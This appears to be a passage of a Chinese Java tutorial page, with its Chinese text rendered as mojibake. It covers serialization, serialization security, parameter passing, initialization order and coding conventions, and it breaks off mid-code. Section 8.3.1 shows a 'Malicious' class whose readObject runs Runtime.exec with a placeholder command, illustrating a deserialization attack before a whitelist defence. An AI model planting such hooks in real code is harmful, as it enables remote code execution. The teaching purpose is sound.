                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¬¬å…«ç« ï¼šåºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2>
<h3 data-id="heading-1">8.1 åºåˆ—åŒ–åŸºç¡€</h3>
<h4 data-id="heading-2">8.1.1 ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Ÿ</h4>
<p><strong>åºåˆ—åŒ–</strong>ï¼šå°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµçš„è¿‡ç¨‹<br/>
<strong>ååºåˆ—åŒ–</strong>ï¼šå°†å­—èŠ‚æµæ¢å¤ä¸ºå¯¹è±¡çš„è¿‡ç¨‹</p>
<h4 data-id="heading-3">8.1.2 Serializableæ¥å£</h4>
<p>java</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> implements Serializable {
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;
    <span class="hljs-comment">// å¿…é¡»å®ç°Serializableæ¥å£</span>
}
</code></pre>
<h4 data-id="heading-4">8.1.3 serialVersionUIDçš„ä½œç”¨</h4>
<p><strong>ä½œç”¨</strong>ï¼šç‰ˆæœ¬æ§åˆ¶ï¼Œç¡®ä¿åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç±»ç‰ˆæœ¬ä¸€è‡´</p>
<p>java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
    <span class="hljs-comment">// ä¿®æ”¹ç±»ç»“æ„æ—¶åº”è¯¥æ›´æ–°UID</span>
}
</code></pre>
<h4 data-id="heading-5">8.1.4 transientå…³é”®å­—</h4>
<p>java</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name;
    <span class="hljs-keyword">private</span> transient <span class="hljs-title class_">String</span> password;  <span class="hljs-comment">// ä¸ä¼šè¢«åºåˆ—åŒ–</span>
}
</code></pre>
<h4 data-id="heading-6">8.1.5 åºåˆ—åŒ–çš„ä½¿ç”¨åœºæ™¯</h4>
<ol>
<li>ç½‘ç»œä¼ è¾“</li>
<li>å¯¹è±¡æŒä¹…åŒ–</li>
<li>è¿œç¨‹æ–¹æ³•è°ƒç”¨(RPC)</li>
<li>ç¼“å­˜å­˜å‚¨</li>
</ol>
<h3 data-id="heading-7">8.2 åºåˆ—åŒ–æœºåˆ¶</h3>
<h4 data-id="heading-8">8.2.1 é»˜è®¤åºåˆ—åŒ–æœºåˆ¶</h4>
<p><strong>åŸç†</strong>ï¼šä½¿ç”¨ObjectOutputStreamå’ŒObjectInputStream</p>
<p>java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åºåˆ—åŒ–</span>
<span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">"user.dat"</span>))) {
    oos.writeObject(user);
}

<span class="hljs-comment">// ååºåˆ—åŒ–</span>
<span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"user.dat"</span>))) {
    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) ois.readObject();
}
</code></pre>
<h4 data-id="heading-9">8.2.2 è‡ªå®šä¹‰åºåˆ—åŒ–</h4>
<p>java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> String sensitiveData;
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream oos)</span> 
            <span class="hljs-keyword">throws</span> IOException {
        oos.defaultWriteObject();
        <span class="hljs-comment">// è‡ªå®šä¹‰åŠ å¯†</span>
        oos.writeObject(encrypt(sensitiveData));
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> 
            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {
        ois.defaultReadObject();
        <span class="hljs-comment">// è‡ªå®šä¹‰è§£å¯†</span>
        sensitiveData = decrypt((String) ois.readObject());
    }
}
</code></pre>
<h4 data-id="heading-10">8.2.3 Externalizableæ¥å£</h4>
<p><strong>ä¸Serializableå¯¹æ¯”</strong>ï¼š</p>
<ul>
<li>Externalizableéœ€è¦æ‰‹åŠ¨å®ç°åºåˆ—åŒ–é€»è¾‘</li>
<li>æ€§èƒ½æ›´å¥½ï¼Œæ§åˆ¶æ›´ç»†</li>
</ul>
<p>java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Externalizable</span> {
    <span class="hljs-keyword">private</span> String name;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeExternal</span><span class="hljs-params">(ObjectOutput out)</span> <span class="hljs-keyword">throws</span> IOException {
        out.writeUTF(name);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readExternal</span><span class="hljs-params">(ObjectInput in)</span> 
            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {
        name = in.readUTF();
    }
}
</code></pre>
<h4 data-id="heading-11">8.2.4 åºåˆ—åŒ–çš„ç»§æ‰¿å…³ç³»</h4>
<p><strong>è§„åˆ™</strong>ï¼š</p>
<ol>
<li>çˆ¶ç±»å®ç°Serializable â†’ å­ç±»è‡ªåŠ¨å¯åºåˆ—åŒ–</li>
<li>çˆ¶ç±»æœªå®ç°Serializable â†’ å­ç±»åºåˆ—åŒ–æ—¶ï¼Œçˆ¶ç±»å¿…é¡»æœ‰æ— å‚æ„é€ å™¨</li>
</ol>
<h4 data-id="heading-12">8.2.5 é™æ€å­—æ®µå’Œç¬æ€å­—æ®µ</h4>
<ul>
<li>é™æ€å­—æ®µï¼šä¸ä¼šè¢«åºåˆ—åŒ–ï¼ˆå±äºç±»ï¼Œä¸å±äºå¯¹è±¡ï¼‰</li>
<li>ç¬æ€å­—æ®µï¼šä½¿ç”¨transientä¿®é¥°ï¼Œä¸ä¼šè¢«åºåˆ—åŒ–</li>
</ul>
<h3 data-id="heading-13">8.3 åºåˆ—åŒ–å®‰å…¨æ€§</h3>
<h4 data-id="heading-14">8.3.1 åºåˆ—åŒ–æ¼æ´åŸç†</h4>
<p><strong>é—®é¢˜</strong>ï¼šååºåˆ—åŒ–æ—¶å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç </p>
<p>java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Malicious</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> 
            <span class="hljs-keyword">throws</span> Exception {
        Runtime.getRuntime().exec(<span class="hljs-string">"æ¶æ„å‘½ä»¤"</span>);
    }
}
</code></pre>
<h4 data-id="heading-15">8.3.2 ååºåˆ—åŒ–æ”»å‡»é˜²æŠ¤</h4>
<ol>
<li>éªŒè¯è¾“å…¥æ¥æº</li>
<li>ä½¿ç”¨ç™½åå•éªŒè¯ç±»</li>
<li>ä½¿ç”¨å®‰å…¨è¿‡æ»¤å™¨</li>
</ol>
<p>java</p>
<pre><code class="hljs language-scala" lang="scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SafeObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ObjectInputStream</span> </span>{
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-type">Class</span>&lt;?&gt; resolveClass(<span class="hljs-type">ObjectStreamClass</span> desc)
            <span class="hljs-keyword">throws</span> <span class="hljs-type">IOException</span>, <span class="hljs-type">ClassNotFoundException</span> {
        <span class="hljs-comment">// ç™½åå•éªŒè¯</span>
        <span class="hljs-keyword">if</span> (!desc.getName().startsWith(<span class="hljs-string">"com.safe."</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">InvalidClassException</span>(<span class="hljs-string">"ä¸å®‰å…¨çš„ç±»"</span>);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.resolveClass(desc);
    }
}
</code></pre>
<h4 data-id="heading-16">8.3.3 å®‰å…¨çš„åºåˆ—åŒ–å®è·µ</h4>
<ol>
<li>ä½¿ç”¨final serialVersionUID</li>
<li>é¿å…åºåˆ—åŒ–æ•æ„Ÿæ•°æ®</li>
<li>éªŒè¯ååºåˆ—åŒ–å¯¹è±¡</li>
</ol>
<h4 data-id="heading-17">8.3.4 æ›¿ä»£æ–¹æ¡ˆ</h4>
<p><strong>JSONåºåˆ—åŒ–</strong>ï¼š</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">// ä½¿ç”¨Jackson
ObjectMapper <span class="hljs-attr">mapper</span> = new ObjectMapper()<span class="hljs-comment">;</span>
String <span class="hljs-attr">json</span> = mapper.writeValueAsString(user)<span class="hljs-comment">;</span>
User <span class="hljs-attr">user2</span> = mapper.readValue(json, User.class)<span class="hljs-comment">;</span>
</code></pre>
<p><strong>Protobuf</strong>ï¼š</p>
<p>protobuf</p>
<pre><code class="hljs language-ini" lang="ini">// å®šä¹‰.protoæ–‡ä»¶
message User {
    string <span class="hljs-attr">name</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
    int32 <span class="hljs-attr">age</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
}
</code></pre>
<p><strong>å¯¹æ¯”</strong>ï¼š</p>

































<table><thead><tr><th>æ–¹æ¡ˆ</th><th>æ€§èƒ½</th><th>å®‰å…¨æ€§</th><th>å¯è¯»æ€§</th><th>è·¨è¯­è¨€</th></tr></thead><tbody><tr><td>JavaåŸç”Ÿ</td><td>ä¸­</td><td>ä½</td><td>å·®</td><td>å¦</td></tr><tr><td>JSON</td><td>ä½</td><td>é«˜</td><td>å¥½</td><td>æ˜¯</td></tr><tr><td>Protobuf</td><td>é«˜</td><td>é«˜</td><td>å·®</td><td>æ˜¯</td></tr></tbody></table>
<h3 data-id="heading-18">8.4 åºåˆ—åŒ–æ€§èƒ½ä¼˜åŒ–</h3>
<h4 data-id="heading-19">8.4.1 åºåˆ—åŒ–æ€§èƒ½é—®é¢˜</h4>
<ol>
<li>åºåˆ—åŒ–/ååºåˆ—åŒ–å¼€é”€å¤§</li>
<li>åºåˆ—åŒ–åæ•°æ®é‡å¤§</li>
<li>é¢‘ç¹GCå‹åŠ›</li>
</ol>
<h4 data-id="heading-20">8.4.2 åºåˆ—åŒ–æ¡†æ¶å¯¹æ¯”</h4>



































<table><thead><tr><th>æ¡†æ¶</th><th>æ€§èƒ½</th><th>å¤§å°</th><th>æ˜“ç”¨æ€§</th></tr></thead><tbody><tr><td>JavaåŸç”Ÿ</td><td>åŸºå‡†</td><td>åŸºå‡†</td><td>é«˜</td></tr><tr><td>Kryo</td><td>10x+</td><td>å°</td><td>ä¸­</td></tr><tr><td>Hessian</td><td>2x</td><td>ä¸­</td><td>é«˜</td></tr><tr><td>Protobuf</td><td>5x</td><td>å°</td><td>ä½</td></tr></tbody></table>
<h4 data-id="heading-21">8.4.3 åºåˆ—åŒ–å¤§å°ä¼˜åŒ–</h4>
<ol>
<li>ä½¿ç”¨transientæ’é™¤ä¸å¿…è¦å­—æ®µ</li>
<li>ä½¿ç”¨åŸºæœ¬ç±»å‹è€ŒéåŒ…è£…ç±»</li>
<li>å‹ç¼©åºåˆ—åŒ–æ•°æ®</li>
</ol>
<p>java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OptimizedUser</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-type">int</span> tempField;  <span class="hljs-comment">// ä¸åºåˆ—åŒ–</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;                  <span class="hljs-comment">// ä½¿ç”¨åŸºæœ¬ç±»å‹</span>
    <span class="hljs-keyword">private</span> String name;
}
</code></pre>
<h4 data-id="heading-22">8.4.4 åºåˆ—åŒ–ç‰ˆæœ¬å…¼å®¹æ€§</h4>
<p><strong>å…¼å®¹æ€§ç­–ç•¥</strong>ï¼š</p>
<ol>
<li>åªæ·»åŠ æ–°å­—æ®µ â†’ å‘å‰å…¼å®¹</li>
<li>ä¸åˆ é™¤å­—æ®µï¼Œåªæ ‡è®°ä¸ºåºŸå¼ƒ</li>
<li>ä¿®æ”¹serialVersionUIDæ—¶æ˜ç¡®ç‰ˆæœ¬å˜æ›´</li>
</ol>
<h2 data-id="heading-23">ç¬¬åç« ï¼šå…¶ä»–é‡è¦æ¦‚å¿µ</h2>
<h3 data-id="heading-24">10.1 Javaä¸­çš„å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’</h3>
<h4 data-id="heading-25">10.1.1 Javaå‚æ•°ä¼ é€’æœºåˆ¶</h4>
<p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>ï¼šJavaä¸­åªæœ‰å€¼ä¼ é€’ï¼Œæ²¡æœ‰å¼•ç”¨ä¼ é€’</p>
<h4 data-id="heading-26">10.1.2 åŸºæœ¬ç±»å‹å‚æ•°ä¼ é€’</h4>
<p>java</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">modify</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>{
        x = <span class="hljs-number">10</span>;  <span class="hljs-comment">// ä¸å½±å“åŸå§‹å€¼</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>{
        <span class="hljs-type">int</span> a = <span class="hljs-number">5</span>;
        <span class="hljs-built_in">modify</span>(a);
        System.out.<span class="hljs-built_in">println</span>(a);  <span class="hljs-comment">// è¾“å‡º5</span>
    }
}
</code></pre>
<h4 data-id="heading-27">10.1.3 å¼•ç”¨ç±»å‹å‚æ•°ä¼ é€’</h4>
<p>java</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">modifyArray</span>(<span class="hljs-params"><span class="hljs-built_in">int</span>[] arr</span>)</span> {
        arr[<span class="hljs-number">0</span>] = <span class="hljs-number">10</span>;  <span class="hljs-comment">// ä¿®æ”¹å¯¹è±¡å†…å®¹ï¼Œå½±å“åŸå§‹å¯¹è±¡</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">changeReference</span>(<span class="hljs-params"><span class="hljs-built_in">int</span>[] arr</span>)</span> {
        arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>[]{<span class="hljs-number">100</span>};  <span class="hljs-comment">// æ”¹å˜å¼•ç”¨ï¼Œä¸å½±å“åŸå§‹å¼•ç”¨</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>)</span> {
        <span class="hljs-built_in">int</span>[] array = {<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>};
        modifyArray(array);
        System.<span class="hljs-keyword">out</span>.println(array[<span class="hljs-number">0</span>]);  <span class="hljs-comment">// è¾“å‡º10</span>
        
        changeReference(array);
        System.<span class="hljs-keyword">out</span>.println(array[<span class="hljs-number">0</span>]);  <span class="hljs-comment">// ä»ç„¶è¾“å‡º10</span>
    }
}
</code></pre>
<h4 data-id="heading-28">10.1.4 å¸¸è§çš„è¯¯è§£æ¾„æ¸…</h4>
<p><strong>è¯¯è§£</strong>ï¼šJavaæœ‰å¼•ç”¨ä¼ é€’<br/>
<strong>äº‹å®</strong>ï¼šä¼ é€’çš„æ˜¯å¼•ç”¨çš„å‰¯æœ¬ï¼ˆå€¼ä¼ é€’å¼•ç”¨ï¼‰</p>
<h4 data-id="heading-29">10.1.5 å®é™…æ¡ˆä¾‹åˆ†æ</h4>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">class Person {
    String name<span class="hljs-comment">;</span>
    Person(String name) { <span class="hljs-attr">this.name</span> = name<span class="hljs-comment">; }</span>
}

public class Test {
    static void swap(Person a, Person b) {
        Person <span class="hljs-attr">temp</span> = a<span class="hljs-comment">;</span>
        <span class="hljs-attr">a</span> = b<span class="hljs-comment">;</span>
        <span class="hljs-attr">b</span> = temp<span class="hljs-comment">;  // åªäº¤æ¢äº†å‰¯æœ¬ï¼Œä¸å½±å“åŸå§‹å¼•ç”¨</span>
    }
    
    public static void main(String<span class="hljs-section">[]</span> args) {
        Person <span class="hljs-attr">p1</span> = new Person(<span class="hljs-string">"Alice"</span>)<span class="hljs-comment">;</span>
        Person <span class="hljs-attr">p2</span> = new Person(<span class="hljs-string">"Bob"</span>)<span class="hljs-comment">;</span>
        swap(p1, p2)<span class="hljs-comment">;</span>
        System.out.println(p1.name)<span class="hljs-comment">;  // ä»ç„¶æ˜¯"Alice"</span>
    }
}
</code></pre>
<h3 data-id="heading-30">10.2 å¯¹è±¡åˆå§‹åŒ–é¡ºåº</h3>
<h4 data-id="heading-31">10.2.1 å•ä¸ªç±»çš„åˆå§‹åŒ–é¡ºåº</h4>
<ol>
<li>é™æ€å­—æ®µå’Œé™æ€ä»£ç å—ï¼ˆæŒ‰ä»£ç é¡ºåºï¼‰</li>
<li>å®ä¾‹å­—æ®µå’Œå®ä¾‹ä»£ç å—ï¼ˆæŒ‰ä»£ç é¡ºåºï¼‰</li>
<li>æ„é€ æ–¹æ³•</li>
</ol>
<p>java</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">InitOrder</span> {
    <span class="hljs-comment">// 1. é™æ€å­—æ®µ</span>
    <span class="hljs-keyword">static</span> <span class="hljs-built_in">int</span> staticField = initStaticField();
    
    <span class="hljs-comment">// 2. é™æ€ä»£ç å—</span>
    <span class="hljs-keyword">static</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"é™æ€ä»£ç å—"</span>);
    }
    
    <span class="hljs-comment">// 3. å®ä¾‹å­—æ®µ</span>
    <span class="hljs-built_in">int</span> instanceField = initInstanceField();
    
    <span class="hljs-comment">// 4. å®ä¾‹ä»£ç å—</span>
    {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"å®ä¾‹ä»£ç å—"</span>);
    }
    
    <span class="hljs-comment">// 5. æ„é€ æ–¹æ³•</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InitOrder</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æ„é€ æ–¹æ³•"</span>);
    }
}
</code></pre>
<h4 data-id="heading-32">10.2.2 çˆ¶å­ç±»çš„åˆå§‹åŒ–é¡ºåº</h4>
<ol>
<li>çˆ¶ç±»é™æ€ â†’ å­ç±»é™æ€</li>
<li>çˆ¶ç±»å®ä¾‹ â†’ çˆ¶ç±»æ„é€ </li>
<li>å­ç±»å®ä¾‹ â†’ å­ç±»æ„é€ </li>
</ol>
<p>java</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Parent</span> </span>{
    static { <span class="hljs-type">System</span>.out.println(<span class="hljs-string">"Parenté™æ€ä»£ç å—"</span>); }
    { <span class="hljs-type">System</span>.out.println(<span class="hljs-string">"Parentå®ä¾‹ä»£ç å—"</span>); }
    <span class="hljs-type">Parent</span>() { <span class="hljs-type">System</span>.out.println(<span class="hljs-string">"Parentæ„é€ æ–¹æ³•"</span>); }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Parent</span> </span>{
    static { <span class="hljs-type">System</span>.out.println(<span class="hljs-string">"Childé™æ€ä»£ç å—"</span>); }
    { <span class="hljs-type">System</span>.out.println(<span class="hljs-string">"Childå®ä¾‹ä»£ç å—"</span>); }
    <span class="hljs-type">Child</span>() { <span class="hljs-type">System</span>.out.println(<span class="hljs-string">"Childæ„é€ æ–¹æ³•"</span>); }
}
</code></pre>
<h4 data-id="heading-33">10.2.3-10.2.5 æ€»ç»“è¡¨æ ¼</h4>

























<table><thead><tr><th>åˆå§‹åŒ–é˜¶æ®µ</th><th>æ‰§è¡Œæ—¶æœº</th><th>æ‰§è¡Œæ¬¡æ•°</th></tr></thead><tbody><tr><td>é™æ€æˆå‘˜</td><td>ç±»åŠ è½½æ—¶</td><td>1æ¬¡</td></tr><tr><td>å®ä¾‹æˆå‘˜</td><td>æ¯æ¬¡newå¯¹è±¡æ—¶</td><td>Næ¬¡</td></tr><tr><td>æ„é€ æ–¹æ³•</td><td>å¯¹è±¡åˆ›å»ºæœ€å</td><td>Næ¬¡</td></tr></tbody></table>
<h3 data-id="heading-34">10.3 ç¼–ç è§„èŒƒä¸æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-35">10.3.1 å‘½åè§„èŒƒ</h4>
<ul>
<li><strong>ç±»å</strong>ï¼šå¤§é©¼å³°ï¼Œ<code>UserService</code></li>
<li><strong>æ–¹æ³•å</strong>ï¼šå°é©¼å³°ï¼Œ<code>getUserName()</code></li>
<li><strong>å¸¸é‡</strong>ï¼šå…¨å¤§å†™ï¼Œ<code>MAX_SIZE</code></li>
<li><strong>åŒ…å</strong>ï¼šå…¨å°å†™ï¼Œ<code>com.example.util</code></li>
</ul>
<h4 data-id="heading-36">10.3.2 ä»£ç æ ¼å¼</h4>
<p>java</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å¥½çš„æ ¼å¼</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">doSomething</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">if</span> (condition) {
            <span class="hljs-comment">// ç¼©è¿›4ä¸ªç©ºæ ¼</span>
            <span class="hljs-title function_">methodCall</span>();
        }
    }
}
</code></pre>
<h4 data-id="heading-37">10.3.3 æ³¨é‡Šè§„èŒƒ</h4>
<p>java</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">/**
 * ç”¨æˆ·æœåŠ¡ç±»
 * <span class="hljs-doctag">@author</span> ä½œè€…
 * <span class="hljs-doctag">@version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserService</span> </span>{
    
    <span class="hljs-comment">/**
     * æ ¹æ®IDè·å–ç”¨æˆ·
     * <span class="hljs-doctag">@param</span> id ç”¨æˆ·ID
     * <span class="hljs-doctag">@return</span> ç”¨æˆ·å¯¹è±¡
     * <span class="hljs-doctag">@throws</span> UserNotFoundException ç”¨æˆ·ä¸å­˜åœ¨æ—¶æŠ›å‡º
     */</span>
    <span class="hljs-keyword">public</span> User <span class="hljs-title function_ invoke__">getUserById</span>(<span class="hljs-keyword">int</span> id) {
        <span class="hljs-comment">// å•è¡Œæ³¨é‡Š</span>
        <span class="hljs-keyword">return</span> userRepository.<span class="hljs-title function_ invoke__">findById</span>(id);
    }
}
</code></pre>
<h4 data-id="heading-38">10.3.4 å¼‚å¸¸å¤„ç†è§„èŒƒ</h4>
<p>java</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// å¥½çš„å®è·µ</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-title function_ invoke__">processFile</span>();
